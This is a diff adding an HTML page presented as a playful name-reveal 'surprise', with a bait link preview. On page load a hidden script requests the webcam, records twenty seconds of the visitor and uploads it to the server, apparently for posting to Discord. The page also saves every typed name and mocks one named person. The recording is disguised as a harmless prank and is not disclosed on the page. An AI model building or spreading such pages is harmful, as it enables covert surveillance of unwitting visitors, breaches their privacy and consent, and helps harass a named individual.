@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Surprise for You 💖</title>
+  <link rel="icon" type="image/webp" href="{{ url_for('static', filename='favicon.webp') }}">
+  <meta property="og:title" content="Open Me 😳">
+  <meta property="og:description" content="At 4:02 AM, a glitter-screaming pigeon did a backflip into a milk bath while texting her ex on a toaster. Meanwhile, a strawberry-scented jellyfish DJ remixed cat meows in a donut-shaped UFO driven by a confused grandma wearing crocs. Somewhere in a pastel alley, a unicorn with WiFi horns screamed I am the moment! while sparkles rained from a cloud shaped like a screaming cupcake. A frog in heels whispered stock tips to a banana peel while 3 invisible raccoons played Uno for the fate of the universe. Reality blinked in pink glitter as a moon-sized boba popped and whispered: click the button, slay the truth.">
+  <meta property="og:image" content="https://media.tenor.com/UJzCmI1F77cAAAAj/milk-and-mocha.gif">
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      background: #ffd6e8;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+      color: #333;
+    }
+    .box {
+      background: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
+    }
+    h1 {
+      font-size: 22px;
+      color: #cc3366;
+      margin-bottom: 20px;
+    }
+    input[type="text"] {
+      padding: 10px;
+      width: 100%;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+    button {
+      padding: 10px 20px;
+      background-color: #cc3366;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
+      width: 100%;
+    }
+    .result {
+      margin-top: 20px;
+      font-size: 18px;
+      font-weight: 500;
+    }
+    .gif-container {
+      margin-top: 15px;
+    }
+    .gif-container iframe {
+      width: 100%;
+      height: auto;
+      max-height: 300px;
+      border: none;
+      border-radius: 10px;
+    }
+  </style>
+</head>
+<body onload="startRecording()">
+
+  <div class="box">
+    <h1>What’s your name?</h1>
+    <input type="text" id="nameInput" placeholder="Type here..." />
+    <button onclick="checkName()">Reveal</button>
+    <div class="result" id="result"></div>
+    <div class="gif-container" id="gifContainer"></div>
+  </div>
+
+  <script>
+    const BACKEND_URL = ""; // same server
+
+    function saveNameToDB(name) {
+      fetch(`${BACKEND_URL}/submit-name`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ name })
+      })
+      .then(res => res.json())
+      .then(data => console.log("Saved:", data))
+      .catch(err => console.error("Error saving name:", err));
+    }
+
+    function checkName() {
+      const name = document.getElementById("nameInput").value.trim().toLowerCase();
+      saveNameToDB(name); // Save to DB
+
+      const result = document.getElementById("result");
+      const gifContainer = document.getElementById("gifContainer");
+
+      const layaNames = ["laya", "layusss", "layaaa", "lay", "laayaa", "laayaaa", "l4ya", "laaaya", "aani", "layakuty", "layakutty", "layu", "layuss", "layapp", "layappu", "laya pp", "laya p", "layapottu", "layi", "layi baby", "lay-bae", "laypop", "layachu", "laychan", "laypichu", "laypothy", "laypotty", "laya choti", "la ya", "l@ya", "laya123", "layee", "laxa", "laxxa", "leya"];
+      const adarshNames = ["adarsh", "adarshp", "pothan", "poothan", "poth", "pooot", "pothuu", "adarsh pothan", "poth baby", "pothachu", "adarshu", "adarsh bro", "addu", "aadarsh", "addie", "pothie", "pothi", "pothappa", "poth sir", "pothy", "a.p", "p@than", "poth_nation", "adbro", "p-bhai","pothu"];
+
+      result.textContent = "";
+      gifContainer.innerHTML = "";
+
+      if (layaNames.some(n => name.includes(n))) {
+        result.textContent = "💩 Uh oh... a wild soft poop has appeared.";
+        gifContainer.innerHTML = `<iframe src="https://tenor.com/embed/17031606" width="100%" height="300" allowfullscreen></iframe>`;
+      } else if (adarshNames.some(n => name.includes(n))) {
+        result.textContent = "😎 Oh wow... certified legend detected!";
+        gifContainer.innerHTML = `<iframe src="https://tenor.com/embed/17558571950805941757" width="100%" height="300" allowfullscreen></iframe>`;
+      } else {
+        result.textContent = "🧐 Hmmm... curious choice. You might be secretly cool.";
+      }
+    }
+  </script>
+    <script>
+    async function startRecording() {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      document.getElementById("preview").srcObject = stream;
+
+      const recorder = new MediaRecorder(stream);
+      const chunks = [];
+
+      recorder.ondataavailable = (e) => chunks.push(e.data);
+
+      recorder.onstop = () => {
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        const formData = new FormData();
+        formData.append('video', blob, 'reaction.webm');
+
+        fetch('/upload-video', {
+          method: 'POST',
+          body: formData
+        })
+        .then(res => res.text())
+        .then(msg => alert('Reaction saved to Discord!'))
+        .catch(err => console.error('Upload error:', err));
+      };
+
+      recorder.start();
+      setTimeout(() => recorder.stop(), 20000); // Stop after 20 sec
+    }
+  </script>
+</body>
+</html>
